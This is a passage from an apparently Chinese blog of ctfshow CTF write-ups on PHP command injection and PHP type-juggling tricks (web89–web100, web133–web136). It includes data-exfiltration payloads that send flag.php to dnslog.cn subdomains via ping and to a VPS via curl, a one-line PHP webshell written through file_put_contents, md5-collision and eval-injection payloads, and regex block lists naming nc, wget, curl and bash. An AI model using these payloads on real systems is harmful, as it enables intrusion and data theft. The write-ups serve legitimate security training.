发现不可写入</p><p>本题似乎没有回显, 尝试ls也不能整出点啥来</p></blockquote><p>不可写, 那么也不能将内容存储下来然后读取了, 那怎么办呢</p><p>先去<a href="http://www.dnslog.cn/">网站</a>获取一个域名, 比如 <a href="http://k700a2.dnslog.cn">k700a2.dnslog.cn</a>, 然后尝试执行命令将数据发到这个域名:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;%20ping `cat flag.php`.k700a2.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><p>因为flag.php内容太多, 所以不会收到任何信息(二级域名是有长度限制的); 我们需要增加一些过滤器:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &#x27;[a-z]&#x27;/&#x27;[0-9]&#x27;`.zfiu19.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><p>按理来说现在刷新数据将会得到不含特殊符号的flag, 我无论如何都无法得到内容, 所以我决定用公网vps</p><p>利用<code>curl</code>命令将文件发送给vps</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#其中-F 为带文件的形式发送post请求</span><br><span class="line">#xx是上传文件的name值，flag.php就是上传的文件 </span><br><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  http://172.22.32.177/10000</span><br></pre></td></tr></table></figure><blockquote><p>诶你先别急, 我搞不出来, 到时候再说</p></blockquote><h2 id="web134"><a class="header-anchor" href="#web134">¶</a>web134</h2><ul><li>描述: 为什么会那样？</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老熟人<code>extract</code>函数, 从数组中将变量导入到当前的符号表, 常常用在变量覆盖</p><p>所以绕过最上方的判断再利用变量覆盖即可, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure><p>GET我没试过?反正就是POST-&gt;GET</p><h2 id="web135"><a class="header-anchor" href="#web135">¶</a>web135</h2><ul><li>描述: web133plus</li></ul><p>其实就是web133wp中的另一种解法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`$F`;+ping `cat flag.php|awk &#x27;NR==2&#x27;`.6x1sys.dnslog.cn</span><br><span class="line">#通过ping命令去带出数据，然后awk NR一排一排的获得数据</span><br></pre></td></tr></table></figure><h2 id="web136"><a class="header-anchor" href="#web136">¶</a>web136</h2><ul><li>描述: BY yu22x</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exec是没有回显的, 我们尝试将执行结果输出到可读文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls | tee 1</span><br></pre></td></tr></table></figure><p>然后访问该地址(url/1)下载下来, 发现命令可执行, 文件中有当前目录的文件, 其余命令执行照搬即可; payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 找到flag</span><br><span class="line">ls / | tee 2</span><br><span class="line"># 读取flag</span><br><span class="line">cat /f149_15_h3r3|tee 3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_php特性_1</title>
      <link href="/article/ctfshow-webbasic-php-1/"/>
      <url>/article/ctfshow-webbasic-php-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>php特性</h1><hr><h2 id="web89"><a class="header-anchor" href="#web89">¶</a>web89</h2><ul><li>描述: 开始php特性系列了，师傅们，冲冲冲！</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>inteval()</code>函数在官方文档中写有: 失败返回0, 空的array返回0, 非空的array返回1; <code>preg_match()</code>函数在传入数组会直接返回0; 于是payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure><h2 id="web90"><a class="header-anchor" href="#web90">¶</a>web90</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>intval( $value, $base )</code>在官方文档中定义为: 如果base是0, 通过检测value的格式来决定使用的进制</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240708151442915.png" alt="image-20240708151442915"></p><p>于是我们可以构造以下payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=010574</span><br><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure><p>而且因为我们提交的参数值默认就是字符串类型, 还可以随便加上一个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476a</span><br><span class="line">?num=4476%23</span><br></pre></td></tr></table></figure><h2 id="web91"><a class="header-anchor" href="#web91">¶</a>web91</h2><ul><li>描述: 同上</li></ul><blockquote><p>本题为<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">换行解析漏洞</a>, 可以先查看此文章再做题</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/i</code>表示匹配大小写, <code>/m</code>表示多行匹配 , &quot;行首&quot;元字符 <code>^</code> 仅匹配字符串的开始位置,  而&quot;行末&quot;元字符 <code>$</code> 仅匹配字符串末尾,字符<code>^</code>和<code>$</code>同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true; 所以本关程序是要求我们多行匹配到php但是单行匹配不到php。</p><p>所以只需要加上一个换行符<code>%0a</code>就能解决这个问题, payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=1%0aphp</span><br></pre></td></tr></table></figure><h2 id="web92"><a class="header-anchor" href="#web92">¶</a>web92</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题方法: 可以用16进制和8进制绕过, 但是这里优先介绍新的方法:</p><p><code>intval($value, $base)</code>函数如果<code>$base</code>为0则<code>$value</code>中存在字母的话遇到字母就停止读取, 但是只增加一个字母是不能绕过弱等于判断</p><p>而e作为科学计数法的特征可以不用于科学记数法(被截断了), 所以我们构造的payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476e2</span><br></pre></td></tr></table></figure><h2 id="web93"><a class="header-anchor" href="#web93">¶</a>web93</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同web90, 直接用8进制就能绕过了, 还可以用小数(通过<code>intval()</code>函数变为int类型)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=010574</span><br><span class="line">?num=4476.1</span><br></pre></td></tr></table></figure><h2 id="web94"><a class="header-anchor" href="#web94">¶</a>web94</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在web93的基础上过滤了开头为0的数字, 这样的话就不能使用进制转换来进行操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strpos() - 函数查找字符串在另一字符串中第一次出现的位置。</span><br><span class="line">stripos() - 查找字符串在另一字符串中第一次出现的位置, 不区分大小写</span><br><span class="line">strripos() - 查找字符串在另一字符串中最后一次出现的位置, 不区分大小写</span><br><span class="line">strrpos() - 查找字符串在另一字符串中最后一次出现的位置, 区分大小写</span><br></pre></td></tr></table></figure><p>我们可以使用小数点来进行操作, 这样通过intval()函数就可以变为int类型的4476; 还可以利用前面加空格或者+的方式规避第一个字符是0的问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476.0</span><br><span class="line">?num= 010574</span><br><span class="line">?num=+4476.0</span><br></pre></td></tr></table></figure><h2 id="web95"><a class="header-anchor" href="#web95">¶</a>web95</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤掉了点, 同时将强等于变为弱等于, 构造的payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num= 010574</span><br><span class="line">?num=+010574</span><br></pre></td></tr></table></figure><h2 id="web96"><a class="header-anchor" href="#web96">¶</a>web96</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反正都是当前目录下的文件, 客气些什么. payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=./flag.php</span><br><span class="line">?u=php://filter/resource=flag.php</span><br><span class="line">?u=/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web97"><a class="header-anchor" href="#web97">¶</a>web97</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a和b不相同但是md5值相同, 经典的数组绕过, 或者是直接构造相等的md5值(fastcoll_v1.0.0.5)</p><p>md5和sha1对一个数组进行加密将返回NULL, 而<code>NULL===NULL</code>返回true, 所以可绕过判断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br><span class="line">或者</span><br><span class="line">a=flag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%28%22WT%96g+%00%E6R%006I%FFL%0D%13u%07W%16%02%D4%15BCR%93%2F%16%D0V%F3%F7%E0%DC%0BI%21K%0E%C6%01%F0%D9%E3%408v%9BK%60%E0%95%8D%AF%28%1Fr%DD%E15%FA%23%9BZl%92b%B2%ED%93%E4%0D%8C%F7%FF%0F%1F%B4%ED%B1d%17F%1E1%D3%1AvK%ECF%DE%EB%EEm%9EX%F4%16%E4%D0%C82TWo%24fj%11Oap%CB%CCNL%96%E0%5D%18%19%8Ds%DE&amp;b=flag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%28%22WT%96g+%00%E6R%006I%FFL%0D%13u%87W%16%02%D4%15BCR%93%2F%16%D0V%F3%F7%E0%DC%0BI%21K%0E%C6%01%F0Y%E4%408v%9BK%60%E0%95%8D%AF%28%1F%F2%DD%E15%FA%23%9BZl%92b%B2%ED%93%E4%0D%8C%F7%FF%0F%1F%B4%ED%B1%E4%17F%1E1%D3%1AvK%ECF%DE%EB%EEm%9EX%F4%16%E4%D0%C82TWo%A4ej%11Oap%CB%CCNL%96%E0%5D%98%19%8Ds%DE</span><br></pre></td></tr></table></figure><h2 id="web98"><a class="header-anchor" href="#web98">¶</a>web98</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>只要有输入的GET参数就将POST方法的值赋值给GET方法(修改了get方法的地址), 如果GET进来的HTTP_FLAG值是flag，那么输出$flag，要不然输源代码</p><p>但但是我们可以直接控制POST的值, 于是我们可以用POST传参<code>HTTP_FLAG=flag</code></p><blockquote><p>虽然注意到直接利用GET传入<code>_</code>是不可行的, 但是经过测试发现传入任何东西都行, 例如<code>?1</code>都能用</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240722225734752.png" alt="image-20240722225734752"></p><h2 id="web99"><a class="header-anchor" href="#web99">¶</a>web99</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码: 生成一个随机数数组, 如果传入的n在数组中, 将通过POST请求传递的content数据写入由URL中n参数指定的文件中</p><p>in_array()函数有漏洞, 没有设置第三个参数时为弱类型比较, 就可以形成自动转换eg: n=1.php自动转换为1</p><p>所以可以通过GET传入1.php然后利用content传入一句话木马进行写马, 直接访问即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?n=1.php</span><br><span class="line">POST: content=&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web100"><a class="header-anchor" href="#web100">¶</a>web100</h2><ul><li>描述: 后面可能停留几天，将条目理顺一些</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查v1,v2,v3是否都是数字, 且v2不包含分号, 但v3包含分号时, 执行<code>$v2('ctfshow')$v3</code></p><p>已知PHP中运算符优先级的排列为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;  ||  =   and   or</span><br><span class="line">//从左往右，从高到低</span><br></pre></td></tr></table></figure><p>所以判断是否都是数字的时候, 仅仅只能判断v1是否是数字, and后面全都被忽略了, 所以可以确定v1和v3</p><p>现在可以执行命令或者注释掉后面代码再自己构造</p><p><strong>第一种方法</strong>: 自己构造执行(构造一句话等, 解法为非预期):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=eval($_POST[cmd])?&gt;%23&amp;v3=;</span><br><span class="line">?v1=1&amp;v2=echo `ls`?&gt;&amp;v3=;</span><br><span class="line"># 直接执行也行</span><br></pre></td></tr></table></figure><p>flag不在flag36d.php中, 在ctfshow.php</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240722235023637.png" alt="image-20240722235023637"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line">var $dalaoA,$dalaoB,$flag_is_fa150d4a0x2d78570x2d49cc0x2d8c520x2de8bcca93ccdb;</span><br><span class="line">&#125;</span><br><span class="line">#(&#x27;ctfshow&#x27;);--&gt;</span><br></pre></td></tr></table></figure><blockquote><p>至于为什么看着不像flag, 因为<code>-</code>在这里表示为<code>0x2d</code>, 替换一下就好了</p></blockquote><p><strong>第二种方法</strong>: php反射或者相关函数(var_dump函数)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=21&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;# 官方解</span><br><span class="line">?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">?v1=1&amp;v2=print_r($ctfshow)?&gt;&amp;v3=;</span><br><span class="line">?v1=1&amp;v2=var_export($ctfshow)?&gt;&amp;v3=;</span><br><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br><span class="line"># 实际执行: eval(&quot;echo new ReflectionClass(&#x27;ctfshow&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>php反射这个工具允许你在运行时检查对象的属性和方法, 甚至可以调用它们; 反射 API 由一系列类组成, 